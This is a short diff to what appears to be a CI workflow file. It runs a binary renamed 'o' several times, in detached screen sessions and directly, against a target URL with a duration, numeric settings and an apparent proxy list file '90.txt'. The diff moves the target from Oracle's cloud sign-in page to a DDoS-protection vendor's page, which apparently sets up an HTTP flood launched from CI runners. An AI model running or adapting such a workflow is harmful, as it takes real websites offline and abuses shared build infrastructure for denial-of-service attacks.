@@ -36,10 +36,10 @@ jobs:
           chmod +x *
           mv tol o          
           
-          screen -dms ve ./o https://www.oracle.com/cloud/sign-in.html 240 1 1 90.txt
-          screen -dms ve ./o https://www.oracle.com/cloud/sign-in.html 240 1 1 90.txt
+          screen -dms ve ./o https://stormwall.pro/products/website-ddos-protection 240 1 1 90.txt
+          screen -dms ve ./o https://stormwall.pro/products/website-ddos-protection 240 1 1 90.txt
           
-          ./o https://www.oracle.com/cloud/sign-in.html 240 1 1 90.txt
+          ./o https://stormwall.pro/products/website-ddos-protection 240 1 1 90.txt
 
           
 
